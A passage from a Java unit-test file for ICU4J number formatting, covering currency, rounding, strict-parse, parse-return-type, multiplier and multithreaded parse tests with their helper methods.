assertEquals(\"-￥35\", \"-￥35\", buffer9.toString());\n        assertEquals(\"cp begin\", 1, cp.getBeginIndex());\n        assertEquals(\"cp end\", 2, cp.getEndIndex());\n\n        // Negative value with PLURALCURRENCYSTYLE.\n        plCurrencyFmt = NumberFormat.getInstance(new Locale(\"ja\", \"ch\"), NumberFormat.PLURALCURRENCYSTYLE);\n        StringBuffer buffer10 = new StringBuffer();\n        plCurrencyFmt.format(negAmount, buffer10, cp);\n        assertEquals(\"-34.57 スイス フラン\", \"-34.57 スイス フラン\", buffer10.toString());\n        assertEquals(\"cp begin\", 7, cp.getBeginIndex());\n        assertEquals(\"cp end\", 14, cp.getEndIndex());\n\n        // Nagative value with PLURALCURRENCYSTYLE, Arabic digits.\n        nf = (DecimalFormat) com.ibm.icu.text.NumberFormat.getCurrencyInstance(new Locale(\"ar\", \"eg\"));\n        plCurrencyFmt = NumberFormat.getInstance(new Locale(\"ar\", \"eg\"), NumberFormat.PLURALCURRENCYSTYLE);\n        StringBuffer buffer11 = new StringBuffer();\n        plCurrencyFmt.format(negAmount, buffer11, cp);\n        assertEquals(\"؜-٣٤٫٥٧ جنيه مصري\", \"؜-٣٤٫٥٧ جنيه مصري\", buffer11.toString());\n        assertEquals(\"cp begin\", 8, cp.getBeginIndex());\n        assertEquals(\"cp end\", 17, cp.getEndIndex());\n    }\n\n    @Test\n    public void TestRounding() {\n        DecimalFormat nf = (DecimalFormat) com.ibm.icu.text.NumberFormat.getInstance(ULocale.ENGLISH);\n        if (false) { // for debugging specific value\n            nf.setRoundingMode(BigDecimal.ROUND_HALF_UP);\n            checkRounding(nf, new BigDecimal(\"300.0300000000\"), 0, new BigDecimal(\"0.020000000\"));\n        }\n        // full tests\n        int[] roundingIncrements = {1, 2, 5, 20, 50, 100};\n        int[] testValues = {0, 300};\n        for (int j = 0; j < testValues.length; ++j) {\n            for (int mode = BigDecimal.ROUND_UP; mode < BigDecimal.ROUND_HALF_EVEN; ++mode) {\n                nf.setRoundingMode(mode);\n                for (int increment = 0; increment < roundingIncrements.length; ++increment) {\n                    BigDecimal base = new BigDecimal(testValues[j]);\n                    BigDecimal rInc = new BigDecimal(roundingIncrements[increment]);\n                    checkRounding(nf,  base, 20, rInc);\n                    rInc = new BigDecimal(\"1.000000000\").divide(rInc);\n                    checkRounding(nf,  base, 20, rInc);\n                }\n            }\n        }\n    }\n\n    @Test\n    public void TestRoundingPattern() {\n        class TestRoundingPatternItem {\n            String     pattern;\n            BigDecimal roundingIncrement;\n            double     testCase;\n            String     expected;\n\n            TestRoundingPatternItem(String pattern, BigDecimal roundingIncrement, double testCase, String expected) {\n                this.pattern = pattern;\n                this.roundingIncrement = roundingIncrement;\n                this.testCase = testCase;\n                this.expected = expected;\n            }\n        };\n\n        TestRoundingPatternItem []tests = {\n                new TestRoundingPatternItem(\"##0.65\", new BigDecimal(\"0.65\"), 1.234, \"1.30\"),\n                new TestRoundingPatternItem(\"#50\", new BigDecimal(\"50\"), 1230, \"1250\")\n        };\n\n        DecimalFormat df = (DecimalFormat) com.ibm.icu.text.NumberFormat.getInstance(ULocale.ENGLISH);\n        String result;\n        for (int i = 0; i < tests.length; i++) {\n            df.applyPattern(tests[i].pattern);\n\n            result = df.format(tests[i].testCase);\n\n            if (!tests[i].expected.equals(result)) {\n                errln(\"String Pattern Rounding Test Failed: Pattern: \\\"\" + tests[i].pattern + \"\\\" Number: \" + tests[i].testCase + \" - Got: \" + result + \" Expected: \" + tests[i].expected);\n            }\n\n            df.setRoundingIncrement(tests[i].roundingIncrement);\n\n            result = df.format(tests[i].testCase);\n\n            if (!tests[i].expected.equals(result)) {\n                errln(\"BigDecimal Rounding Test Failed: Pattern: \\\"\" + tests[i].pattern + \"\\\" Number: \" + tests[i].testCase + \" - Got: \" + result + \" Expected: \" + tests[i].expected);\n            }\n        }\n    }\n\n    @Test\n    public void TestBigDecimalRounding() {\n        String figure = \"50.000000004\";\n        Double dbl = new Double(figure);\n        BigDecimal dec = new BigDecimal(figure);\n\n        DecimalFormat f = (DecimalFormat) NumberFormat.getInstance();\n        f.applyPattern(\"00.00######\");\n\n        assertEquals(\"double format\", \"50.00\", f.format(dbl));\n        assertEquals(\"bigdec format\", \"50.00\", f.format(dec));\n\n        int maxFracDigits = f.getMaximumFractionDigits();\n        BigDecimal roundingIncrement = new BigDecimal(\"1\").movePointLeft(maxFracDigits);\n\n        f.setRoundingIncrement(roundingIncrement);\n        f.setRoundingMode(BigDecimal.ROUND_DOWN);\n        assertEquals(\"Rounding down\", f.format(dbl), f.format(dec));\n\n        f.setRoundingIncrement(roundingIncrement);\n        f.setRoundingMode(BigDecimal.ROUND_HALF_UP);\n        assertEquals(\"Rounding half up\", f.format(dbl), f.format(dec));\n    }\n\n    void checkRounding(DecimalFormat nf, BigDecimal base, int iterations, BigDecimal increment) {\n        nf.setRoundingIncrement(increment.toBigDecimal());\n        BigDecimal lastParsed = new BigDecimal(Integer.MIN_VALUE); // used to make sure that rounding is monotonic\n        for (int i = -iterations; i <= iterations; ++i) {\n            BigDecimal iValue = base.add(increment.multiply(new BigDecimal(i)).movePointLeft(1));\n            BigDecimal smallIncrement = new BigDecimal(\"0.00000001\");\n            if (iValue.signum() != 0) {\n                smallIncrement.multiply(iValue); // scale unless zero\n            }\n            // we not only test the value, but some values in a small range around it.\n            lastParsed = checkRound(nf, iValue.subtract(smallIncrement), lastParsed);\n            lastParsed = checkRound(nf, iValue, lastParsed);\n            lastParsed = checkRound(nf, iValue.add(smallIncrement), lastParsed);\n        }\n    }\n\n    private BigDecimal checkRound(DecimalFormat nf, BigDecimal iValue, BigDecimal lastParsed) {\n        String formatedBigDecimal = nf.format(iValue);\n        String formattedDouble = nf.format(iValue.doubleValue());\n        if (!equalButForTrailingZeros(formatedBigDecimal, formattedDouble)) {\n\n            errln(\"Failure at: \" + iValue + \" (\" + iValue.doubleValue() + \")\"\n                    + \",\\tRounding-mode: \" + roundingModeNames[nf.getRoundingMode()]\n                            + \",\\tRounding-increment: \" + nf.getRoundingIncrement()\n                            + \",\\tdouble: \" + formattedDouble\n                            + \",\\tBigDecimal: \" + formatedBigDecimal);\n\n        } else {\n            logln(\"Value: \" + iValue\n                    + \",\\tRounding-mode: \" + roundingModeNames[nf.getRoundingMode()]\n                            + \",\\tRounding-increment: \" + nf.getRoundingIncrement()\n                            + \",\\tdouble: \" + formattedDouble\n                            + \",\\tBigDecimal: \" + formatedBigDecimal);\n        }\n        try {\n            // Number should have compareTo(...)\n            BigDecimal parsed = toBigDecimal(nf.parse(formatedBigDecimal));\n            if (lastParsed.compareTo(parsed) > 0) {\n                errln(\"Rounding wrong direction!: \" + lastParsed + \" > \" + parsed);\n            }\n            lastParsed = parsed;\n        } catch (ParseException e) {\n            errln(\"Parse Failure with: \" + formatedBigDecimal);\n        }\n        return lastParsed;\n    }\n\n    static BigDecimal toBigDecimal(Number number) {\n        return number instanceof BigDecimal ? (BigDecimal) number\n                : number instanceof BigInteger ? new BigDecimal((BigInteger)number)\n        : number instanceof java.math.BigDecimal ? new BigDecimal((java.math.BigDecimal)number)\n                : number instanceof Double ? new BigDecimal(number.doubleValue())\n        : number instanceof Float ? new BigDecimal(number.floatValue())\n                : new BigDecimal(number.longValue());\n    }\n\n    static String[] roundingModeNames = {\n        \"ROUND_UP\", \"ROUND_DOWN\", \"ROUND_CEILING\", \"ROUND_FLOOR\",\n        \"ROUND_HALF_UP\", \"ROUND_HALF_DOWN\", \"ROUND_HALF_EVEN\",\n        \"ROUND_UNNECESSARY\"\n    };\n\n    private static boolean equalButForTrailingZeros(String formatted1, String formatted2) {\n        if (formatted1.length() == formatted2.length()) return formatted1.equals(formatted2);\n        return stripFinalZeros(formatted1).equals(stripFinalZeros(formatted2));\n    }\n\n    private static String stripFinalZeros(String formatted) {\n        int len1 = formatted.length();\n        char ch;\n        while (len1 > 0 && ((ch = formatted.charAt(len1-1)) == '0' || ch == '.')) --len1;\n        if (len1==1 && ((ch = formatted.charAt(len1-1)) == '-')) --len1;\n        return formatted.substring(0,len1);\n    }\n\n    //------------------------------------------------------------------\n    // Support methods\n    //------------------------------------------------------------------\n\n    /** Format-Parse test */\n    public void expect2(NumberFormat fmt, Number n, String exp) {\n        // Don't round-trip format test, since we explicitly do it\n        expect(fmt, n, exp, false);\n        expect(fmt, exp, n);\n    }\n    /** Format-Parse test */\n    public void expect3(NumberFormat fmt, Number n, String exp) {\n        // Don't round-trip format test, since we explicitly do it\n        expect_rbnf(fmt, n, exp, false);\n        expect_rbnf(fmt, exp, n);\n    }\n\n    /** Format-Parse test (convenience) */\n    public void expect2(NumberFormat fmt, double n, String exp) {\n        expect2(fmt, new Double(n), exp);\n    }\n    /** RBNF Format-Parse test (convenience) */\n    public void expect3(NumberFormat fmt, double n, String exp) {\n        expect3(fmt, new Double(n), exp);\n    }\n\n    /** Format-Parse test (convenience) */\n    public void expect2(NumberFormat fmt, long n, String exp) {\n        expect2(fmt, new Long(n), exp);\n    }\n    /** RBNF Format-Parse test (convenience) */\n    public void expect3(NumberFormat fmt, long n, String exp) {\n        expect3(fmt, new Long(n), exp);\n    }\n\n    /** Format test */\n    public void expect(NumberFormat fmt, Number n, String exp, boolean rt) {\n        StringBuffer saw = new StringBuffer();\n        FieldPosition pos = new FieldPosition(0);\n        fmt.format(n, saw, pos);\n        String pat = ((DecimalFormat)fmt).toPattern();\n        if (saw.toString().equals(exp)) {\n            logln(\"Ok   \" + n + \" x \" +\n                    pat + \" = \\\"\" +\n                    saw + \"\\\"\");\n            // We should be able to round-trip the formatted string =>\n            // number => string (but not the other way around: number\n            // => string => number2, might have number2 != number):\n            if (rt) {\n                try {\n                    Number n2 = fmt.parse(exp);\n                    StringBuffer saw2 = new StringBuffer();\n                    fmt.format(n2, saw2, pos);\n                    if (!saw2.toString().equals(exp)) {\n                        errln(\"expect() format test rt, locale \" + fmt.getLocale(ULocale.VALID_LOCALE) +\n                                \", FAIL \\\"\" + exp + \"\\\" => \" + n2 + \" => \\\"\" + saw2 + '\"');\n                    }\n                } catch (ParseException e) {\n                    errln(\"expect() format test rt, locale \" + fmt.getLocale(ULocale.VALID_LOCALE) +\n                            \", \" + e.getMessage());\n                    return;\n                }\n            }\n        } else {\n            errln(\"expect() format test, locale \" + fmt.getLocale(ULocale.VALID_LOCALE) +\n                    \", FAIL \" + n + \" x \" + pat + \" = \\\"\" + saw + \"\\\", expected \\\"\" + exp + \"\\\"\");\n        }\n    }\n    /** RBNF format test */\n    public void expect_rbnf(NumberFormat fmt, Number n, String exp, boolean rt) {\n        StringBuffer saw = new StringBuffer();\n        FieldPosition pos = new FieldPosition(0);\n        fmt.format(n, saw, pos);\n        if (saw.toString().equals(exp)) {\n            logln(\"Ok   \" + n + \" = \\\"\" +\n                    saw + \"\\\"\");\n            // We should be able to round-trip the formatted string =>\n            // number => string (but not the other way around: number\n            // => string => number2, might have number2 != number):\n            if (rt) {\n                try {\n                    Number n2 = fmt.parse(exp);\n                    StringBuffer saw2 = new StringBuffer();\n                    fmt.format(n2, saw2, pos);\n                    if (!saw2.toString().equals(exp)) {\n                        errln(\"expect_rbnf() format test rt, locale \" + fmt.getLocale(ULocale.VALID_LOCALE) +\n                                \", FAIL \\\"\" + exp + \"\\\" => \" + n2 + \" => \\\"\" + saw2 + '\"');\n                    }\n                } catch (ParseException e) {\n                    errln(\"expect_rbnf() format test rt, locale \" + fmt.getLocale(ULocale.VALID_LOCALE) +\n                            \", \" + e.getMessage());\n                    return;\n                }\n            }\n        } else {\n            errln(\"expect_rbnf() format test, locale \" + fmt.getLocale(ULocale.VALID_LOCALE) +\n                    \", FAIL \" + n + \" = \\\"\" + saw + \"\\\", expected \\\"\" + exp + \"\\\"\");\n        }\n    }\n\n    /** Format test (convenience) */\n    public void expect(NumberFormat fmt, Number n, String exp) {\n        expect(fmt, n, exp, true);\n    }\n\n    /** Format test (convenience) */\n    public void expect(NumberFormat fmt, double n, String exp) {\n        expect(fmt, new Double(n), exp);\n    }\n\n    /** Format test (convenience) */\n    public void expect(NumberFormat fmt, long n, String exp) {\n        expect(fmt, new Long(n), exp);\n    }\n\n    /** Parse test */\n    public void expect(NumberFormat fmt, String str, Number n) {\n        Number num = null;\n        try {\n            num = fmt.parse(str);\n        } catch (ParseException e) {\n            errln(e.getMessage());\n            return;\n        }\n        String pat = ((DecimalFormat)fmt).toPattern();\n        // A little tricky here -- make sure Double(12345.0) and\n        // Long(12345) match.\n        if (num.equals(n) || num.doubleValue() == n.doubleValue()) {\n            logln(\"Ok   \\\"\" + str + \"\\\" x \" +\n                    pat + \" = \" +\n                    num);\n        } else {\n            errln(\"expect() parse test, locale \" + fmt.getLocale(ULocale.VALID_LOCALE) +\n                    \", FAIL \\\"\" + str + \"\\\" x \" + pat + \" = \" + num + \", expected \" + n);\n        }\n    }\n\n    /** RBNF Parse test */\n    public void expect_rbnf(NumberFormat fmt, String str, Number n) {\n        Number num = null;\n        try {\n            num = fmt.parse(str);\n        } catch (ParseException e) {\n            errln(e.getMessage());\n            return;\n        }\n        // A little tricky here -- make sure Double(12345.0) and\n        // Long(12345) match.\n        if (num.equals(n) || num.doubleValue() == n.doubleValue()) {\n            logln(\"Ok   \\\"\" + str + \" = \" +\n                    num);\n        } else {\n            errln(\"expect_rbnf() parse test, locale \" + fmt.getLocale(ULocale.VALID_LOCALE) +\n                    \", FAIL \\\"\" + str + \" = \" + num + \", expected \" + n);\n        }\n    }\n\n    /** Parse test (convenience) */\n    public void expect(NumberFormat fmt, String str, double n) {\n        expect(fmt, str, new Double(n));\n    }\n\n    /** Parse test (convenience) */\n    public void expect(NumberFormat fmt, String str, long n) {\n        expect(fmt, str, new Long(n));\n    }\n\n    /** Parse test */\n    public void expectParseException(DecimalFormat fmt, String str, Number n) {\n        Number num = null;\n        try {\n            num = fmt.parse(str);\n            errln(\"Expected failure, but passed: \" + n + \" on \" + fmt.toPattern() + \" -> \" + num);\n        } catch (ParseException e) {\n        }\n    }\n\n    private void expectCurrency(NumberFormat nf, Currency curr,\n            double value, String string) {\n        DecimalFormat fmt = (DecimalFormat) nf;\n        if (curr != null) {\n            fmt.setCurrency(curr);\n        }\n        String s = fmt.format(value).replace('\\u00A0', ' ');\n\n        if (s.equals(string)) {\n            logln(\"Ok: \" + value + \" x \" + curr + \" => \" + s);\n        } else {\n            errln(\"FAIL: \" + value + \" x \" + curr + \" => \" + s +\n                    \", expected \" + string);\n        }\n    }\n\n    public void expectPad(DecimalFormat fmt, String pat, int pos) {\n        expectPad(fmt, pat, pos, 0, (char)0);\n    }\n\n    public void expectPad(DecimalFormat fmt, final String pat, int pos, int width, final char pad) {\n        int apos = 0, awidth = 0;\n        char apadStr;\n        try {\n            fmt.applyPattern(pat);\n            apos = fmt.getPadPosition();\n            awidth = fmt.getFormatWidth();\n            apadStr = fmt.getPadCharacter();\n        } catch (Exception e) {\n            apos = -1;\n            awidth = width;\n            apadStr = pad;\n        }\n\n        if (apos == pos && awidth == width && apadStr == pad) {\n            logln(\"Ok   \\\"\" + pat + \"\\\" pos=\"\n                    + apos + ((pos == -1) ? \"\" : \" width=\" + awidth + \" pad=\" + apadStr));\n        } else {\n            errln(\"FAIL \\\"\" + pat + \"\\\" pos=\" + apos + \" width=\"\n                    + awidth + \" pad=\" + apadStr + \", expected \"\n                    + pos + \" \" + width + \" \" + pad);\n        }\n    }\n\n    public void expectPat(DecimalFormat fmt, final String exp) {\n        String pat = fmt.toPattern();\n        if (pat.equals(exp)) {\n            logln(\"Ok   \\\"\" + pat + \"\\\"\");\n        } else {\n            errln(\"FAIL \\\"\" + pat + \"\\\", expected \\\"\" + exp + \"\\\"\");\n        }\n    }\n\n\n    private void expectParseCurrency(NumberFormat fmt, Currency expected, String text) {\n        ParsePosition pos = new ParsePosition(0);\n        CurrencyAmount currencyAmount = fmt.parseCurrency(text, pos);\n        assertTrue(\"Parse of \" + text + \" should have succeeded.\", pos.getIndex() > 0);\n        assertEquals(\"Currency should be correct.\", expected, currencyAmount.getCurrency());\n    }\n\n    @Test\n    public void TestJB3832(){\n        ULocale locale = new ULocale(\"pt_PT@currency=PTE\");\n        NumberFormat format = NumberFormat.getCurrencyInstance(locale);\n        Currency curr = Currency.getInstance(locale);\n        logln(\"\\nName of the currency is: \" + curr.getName(locale, Currency.LONG_NAME, new boolean[] {false}));\n        CurrencyAmount cAmt = new CurrencyAmount(1150.50, curr);\n        logln(\"CurrencyAmount object's hashCode is: \" + cAmt.hashCode()); //cover hashCode\n        String str = format.format(cAmt);\n        String expected = \"1,150$50\\u00a0\\u200b\";\n        if(!expected.equals(str)){\n            errln(\"Did not get the expected output Expected: \"+expected+\" Got: \"+ str);\n        }\n    }\n\n    @Test\n    public void TestScientificWithGrouping() {\n        // Grouping separators are not allowed in the pattern, but we can enable them via the API.\n        DecimalFormat df = new DecimalFormat(\"###0.000E0\");\n        df.setGroupingUsed(true);\n        df.setGroupingSize(3);\n        expect2(df, 123, \"123.0E0\");\n        expect2(df, 1234, \"1,234E0\");\n        expect2(df, 12340, \"1.234E4\");\n    }\n\n    @Test\n    public void TestStrictParse() {\n        // Pass both strict and lenient:\n        String[] pass = {\n                \"0\",           // single zero before end of text is not leading\n                \"0 \",          // single zero at end of number is not leading\n                \"0.\",          // single zero before period (or decimal, it's ambiguous) is not leading\n                \"0,\",          // single zero before comma (not group separator) is not leading\n                \"0.0\",         // single zero before decimal followed by digit is not leading\n                \"0. \",         // same as above before period (or decimal) is not leading\n                \"0.100,5\",     // comma stops parse of decimal (no grouping)\n                \"0.100,,5\",    // two commas also stops parse\n                \".00\",         // leading decimal is ok, even with zeros\n                \"1234567\",     // group separators are not required\n                \"12345, \",     // comma not followed by digit is not a group separator, but end of number\n                \"1,234, \",     // if group separator is present, group sizes must be appropriate\n                \"1,234,567\",   // ...secondary too\n                \"0E\",          // an exponent not followed by zero or digits is not an exponent\n                \"00\",          // leading zero before zero - used to be error - see ticket #7913\n                \"012\",         // leading zero before digit - used to be error - see ticket #7913\n                \"0,456\",       // leading zero before group separator - used to be error - see ticket #7913\n                \"999,999\",     // see ticket #6863\n                \"-99,999\",     // see ticket #6863\n                \"-999,999\",    // see ticket #6863\n                \"-9,999,999\",  // see ticket #6863\n        };\n        // Pass lenient, fail strict:\n        String[] fail = {\n                \"1,2\",       // wrong number of digits after group separator\n                \",.02\",      // leading group separator before decimal\n                \"1,.02\",     // group separator before decimal\n                \",0\",        // leading group separator before a single digit\n                \",1\",        // leading group separator before a single digit\n                \"1,45\",      // wrong number of digits in primary group\n                \"1,45 that\", // wrong number of digits in primary group\n                \"1,45.34\",   // wrong number of digits in primary group\n                \"1234,567\",  // wrong number of digits in secondary group\n                \"12,34,567\", // wrong number of digits in secondary group\n                \"1,23,456,7890\", // wrong number of digits in primary and secondary groups\n        };\n        // Fail both lenient and strict:\n        String[] failBoth = {\n        };\n\n        DecimalFormat nf = (DecimalFormat) NumberFormat.getInstance(Locale.ENGLISH);\n        runStrictParseBatch(nf, pass, fail, failBoth);\n\n        String[] scientificPass = {\n                \"0E2\",      // single zero before exponent is ok\n                \"1234E2\",   // any number of digits before exponent is ok\n                \"1,234E\",   // an exponent string not followed by zero or digits is not an exponent\n                \"00E2\",     // leading zeroes now allowed in strict mode - see ticket #\n        };\n        String[] scientificFail = {\n        };\n        String[] scientificFailBoth = {\n        };\n\n        nf = (DecimalFormat) NumberFormat.getInstance(Locale.ENGLISH);\n        runStrictParseBatch(nf, scientificPass, scientificFail, scientificFailBoth);\n\n        String[] mixedPass = {\n                \"12,34,567\",\n                \"12,34,567,\",\n                \"12,34,567, that\",\n                \"12,34,567 that\",\n        };\n        String[] mixedFail = {\n                \"12,34,56\",\n                \"12,34,56,\",\n                \"12,34,56, that \",\n                \"12,34,56 that\",\n        };\n        String[] mixedFailBoth = {\n        };\n\n        nf = new DecimalFormat(\"#,##,##0.#\");\n        runStrictParseBatch(nf, mixedPass, mixedFail, mixedFailBoth);\n    }\n\n    void runStrictParseBatch(DecimalFormat nf, String[] pass, String[] fail, String[] failBoth) {\n        nf.setParseStrict(false);\n        runStrictParseTests(\"should pass\", nf, pass, true);\n        runStrictParseTests(\"should also pass\", nf, fail, true);\n        runStrictParseTests(\"should fail\", nf, failBoth, false);\n        nf.setParseStrict(true);\n        runStrictParseTests(\"should still pass\", nf, pass, true);\n        runStrictParseTests(\"should fail\", nf, fail, false);\n        runStrictParseTests(\"should still fail\", nf, failBoth, false);\n    }\n\n    void runStrictParseTests(String msg, DecimalFormat nf, String[] tests, boolean pass) {\n        logln(\"\");\n        logln(\"pattern: '\" + nf.toPattern() + \"'\");\n        logln(msg);\n        for (int i = 0; i < tests.length; ++i) {\n            String str = tests[i];\n            ParsePosition pp = new ParsePosition(0);\n            Number n = nf.parse(str, pp);\n            String formatted = n != null ? nf.format(n) : \"null\";\n            String err = pp.getErrorIndex() == -1 ? \"\" : \"(error at \" + pp.getErrorIndex() + \")\";\n            if ((err.length() == 0) != pass) {\n                errln(\"'\" + str + \"' parsed '\" +\n                        str.substring(0, pp.getIndex()) +\n                        \"' returned \" + n + \" formats to '\" +\n                        formatted + \"' \" + err);\n            } else {\n                if (err.length() > 0) {\n                    err = \"got expected \" + err;\n                }\n                logln(\"'\" + str + \"' parsed '\" +\n                        str.substring(0, pp.getIndex()) +\n                        \"' returned \" + n + \" formats to '\" +\n                        formatted + \"' \" + err);\n            }\n        }\n    }\n\n    @Test\n    public void TestJB5251(){\n        //save default locale\n        ULocale defaultLocale = ULocale.getDefault();\n        ULocale.setDefault(new ULocale(\"qr_QR\"));\n        try {\n            NumberFormat.getInstance();\n        }\n        catch (Exception e) {\n            errln(\"Numberformat threw exception for non-existent locale. It should use the default.\");\n        }\n        //reset default locale\n        ULocale.setDefault(defaultLocale);\n    }\n\n    @Test\n    public void TestParseReturnType() {\n        String[] defaultLong = {\n                \"123\",\n                \"123.0\",\n                \"0.0\",\n                \"-9223372036854775808\", // Min Long\n                \"9223372036854775807\" // Max Long\n        };\n\n        String[] defaultNonLong = {\n                \"12345678901234567890\",\n                \"9223372036854775808\",\n                \"-9223372036854775809\"\n        };\n\n        String[] doubles = {\n                \"-0.0\",\n                \"NaN\",\n                \"\\u221E\"    // Infinity\n        };\n\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(Locale.US);\n        DecimalFormat nf = new DecimalFormat(\"#.#\", sym);\n\n        if (nf.isParseBigDecimal()) {\n            errln(\"FAIL: isParseDecimal() must return false by default\");\n        }\n\n        // isParseBigDecimal() is false\n        for (int i = 0; i < defaultLong.length; i++) {\n            try {\n                Number n = nf.parse(defaultLong[i]);\n                if (!(n instanceof Long)) {\n                    errln(\"FAIL: parse does not return Long instance\");\n                }\n            } catch (ParseException e) {\n                errln(\"parse of '\" + defaultLong[i] + \"' threw exception: \" + e);\n            }\n        }\n        for (int i = 0; i < defaultNonLong.length; i++) {\n            try {\n                Number n = nf.parse(defaultNonLong[i]);\n                if (n instanceof Long) {\n                    errln(\"FAIL: parse returned a Long\");\n                }\n            } catch (ParseException e) {\n                errln(\"parse of '\" + defaultNonLong[i] + \"' threw exception: \" + e);\n            }\n        }\n        // parse results for doubls must be always Double\n        for (int i = 0; i < doubles.length; i++) {\n            try {\n                Number n = nf.parse(doubles[i]);\n                if (!(n instanceof Double)) {\n                    errln(\"FAIL: parse does not return Double instance\");\n                }\n            } catch (ParseException e) {\n                errln(\"parse of '\" + doubles[i] + \"' threw exception: \" + e);\n            }\n        }\n\n        // force this DecimalFormat to return BigDecimal\n        nf.setParseBigDecimal(true);\n        if (!nf.isParseBigDecimal()) {\n            errln(\"FAIL: isParseBigDecimal() must return true\");\n        }\n\n        // isParseBigDecimal() is true\n        for (int i = 0; i < defaultLong.length + defaultNonLong.length; i++) {\n            String input = (i < defaultLong.length) ? defaultLong[i] : defaultNonLong[i - defaultLong.length];\n            try {\n                Number n = nf.parse(input);\n                if (!(n instanceof BigDecimal)) {\n                    errln(\"FAIL: parse does not return BigDecimal instance\");\n                }\n            } catch (ParseException e) {\n                errln(\"parse of '\" + input + \"' threw exception: \" + e);\n            }\n        }\n        // parse results for doubls must be always Double\n        for (int i = 0; i < doubles.length; i++) {\n            try {\n                Number n = nf.parse(doubles[i]);\n                if (!(n instanceof Double)) {\n                    errln(\"FAIL: parse does not return Double instance\");\n                }\n            } catch (ParseException e) {\n                errln(\"parse of '\" + doubles[i] + \"' threw exception: \" + e);\n            }\n        }\n    }\n\n    @Test\n    public void TestNonpositiveMultiplier() {\n        DecimalFormat df = new DecimalFormat(\"0\");\n\n        // test zero multiplier\n\n        try {\n            df.setMultiplier(0);\n\n            // bad\n            errln(\"DecimalFormat.setMultiplier(0) did not throw an IllegalArgumentException\");\n        } catch (IllegalArgumentException ex) {\n            // good\n        }\n\n        // test negative multiplier\n\n        try {\n            df.setMultiplier(-1);\n\n            if (df.getMultiplier() != -1) {\n                errln(\"DecimalFormat.setMultiplier(-1) did not change the multiplier to -1\");\n                return;\n            }\n\n            // good\n        } catch (IllegalArgumentException ex) {\n            // bad\n            errln(\"DecimalFormat.setMultiplier(-1) threw an IllegalArgumentException\");\n            return;\n        }\n\n        expect(df, \"1122.123\", -1122.123);\n        expect(df, \"-1122.123\", 1122.123);\n        expect(df, \"1.2\", -1.2);\n        expect(df, \"-1.2\", 1.2);\n\n        expect2(df, Long.MAX_VALUE, BigInteger.valueOf(Long.MAX_VALUE).negate().toString());\n        expect2(df, Long.MIN_VALUE, BigInteger.valueOf(Long.MIN_VALUE).negate().toString());\n        expect2(df, Long.MAX_VALUE / 2, BigInteger.valueOf(Long.MAX_VALUE / 2).negate().toString());\n        expect2(df, Long.MIN_VALUE / 2, BigInteger.valueOf(Long.MIN_VALUE / 2).negate().toString());\n\n        expect2(df, BigDecimal.valueOf(Long.MAX_VALUE), BigDecimal.valueOf(Long.MAX_VALUE).negate().toString());\n        expect2(df, BigDecimal.valueOf(Long.MIN_VALUE), BigDecimal.valueOf(Long.MIN_VALUE).negate().toString());\n\n        expect2(df, java.math.BigDecimal.valueOf(Long.MAX_VALUE), java.math.BigDecimal.valueOf(Long.MAX_VALUE).negate().toString());\n        expect2(df, java.math.BigDecimal.valueOf(Long.MIN_VALUE), java.math.BigDecimal.valueOf(Long.MIN_VALUE).negate().toString());\n    }\n\n    @Test\n    public void TestJB5358() {\n        int numThreads = 10;\n        String numstr = \"12345\";\n        double expected = 12345;\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(Locale.US);\n        DecimalFormat fmt = new DecimalFormat(\"#.#\", sym);\n        ArrayList errors = new ArrayList();\n\n        ParseThreadJB5358[] threads = new ParseThreadJB5358[numThreads];\n        for (int i = 0; i < numThreads; i++) {\n            threads[i] = new ParseThreadJB5358((DecimalFormat)fmt.clone(), numstr, expected, errors);\n            threads[i].start();\n        }\n        for (int i = 0; i < numThreads; i++) {\n            try {\n                threads[i].join();\n            } catch (InterruptedException ie) {\n                ie.printStackTrace();\n            }\n        }\n        if (errors.size() != 0) {\n            StringBuffer errBuf = new StringBuffer();\n            for (int i = 0; i < errors.size(); i++) {\n                errBuf.append((String)errors.get(i));\n                errBuf.append(\"\\n\");\n            }\n            errln(\"FAIL: \" + errBuf);\n        }\n    }\n\n    static private class ParseThreadJB5358 extends Thread {\n        private final DecimalFormat decfmt;\n        private final String numstr;\n        private final double expect;\n        private final ArrayList errors;\n\n        public ParseThreadJB5358(DecimalFormat decfmt, String numstr, double expect, ArrayList errors) {\n            this.decfmt = decfmt;\n            this.numstr = numstr;\n            this.expect = expect;\n            this.errors = errors;\n        }\n\n        @Override\n        public void run() {\n            for (int i = 0; i < 10000; i++) {\n                try {\n                    Number n = decfmt.parse(numstr);\n                    if (n.doubleValue() != expect) {\n                        synchronized(errors) {\n                            errors.add(new String(\"Bad parse result - expected:\" + expect + \" actual:\" + n.doubleValue()));\n                        }\n                    }\n                } catch (Throwable t) {\n                    synchronized(errors) {\n                        errors.add(new String(t.getClass().getName() + \" - \" + t.getMessage()));\n                    }\n                }\n            }\n        }\n    }\n\n    @Test\n    public void TestSetCurrency() {\n        DecimalFormatSymbols decf1 = DecimalFormatSymbols.getInstance(ULocale.US);\n        DecimalFormatSymbols decf2 = DecimalFormatSymbols.getInstance(ULocale.US);\n        decf2.setCurrencySymbol(\"UKD\");\n        DecimalFormat format1 = new DecimalFormat(\"000.000\", decf1);\n        DecimalFormat format2 = new DecimalFormat(\"000.000\", decf2);\n        Currency euro = Currency.getInstance(\"EUR\");\n        format1.setCurrency(euro);\n        format2.setCurrency(euro);\n        assertEquals(\"Reset with currency symbol\", format1, format2);\n    }\n\n    /*\n     * Testing the method public StringBuffer format(Object number, ...)\n     */\n    @Test\n    public void TestFormat() {\n        NumberFormat nf = NumberFormat.getInstance();\n        StringBuffer sb = new StringBuffer(\"dummy\");\n        FieldPosition fp = new FieldPosition(0);\n\n        // Tests when \"if (number instanceof Long)\" is true\n        try {\n            nf.format(new Long(\"0\"), sb, fp);\n        } catch (Exception e) {\n            errln(\"NumberFormat.format(Object number, ...) was not suppose to \"\n                    + \"return an exception for a Long object. Error: \" + e);\n        }\n\n        // Tests when \"else if (number instanceof BigInteger)\" is true\n        try {\n            nf.format((Object)new BigInteger(\"0\"), sb, fp);\n        } catch (Exception e) {\n            errln(\"NumberFormat.format(Object number, ...) was not suppose to \"\n                    + \"return an exception for a BigInteger object. Error: \" + e);\n        }\n\n        // Tests when \"else if (number instanceof java.math.BigDecimal)\" is true\n        try {\n            nf.format((Object)new java.math.BigDecimal(\"0\"), sb, fp);\n        } catch (Exception e) {\n            errln(\"NumberFormat.format(Object number, ...) was not suppose to \"\n                    + \"return an exception for a java.math.BigDecimal object. Error: \" + e);\n        }\n\n        // 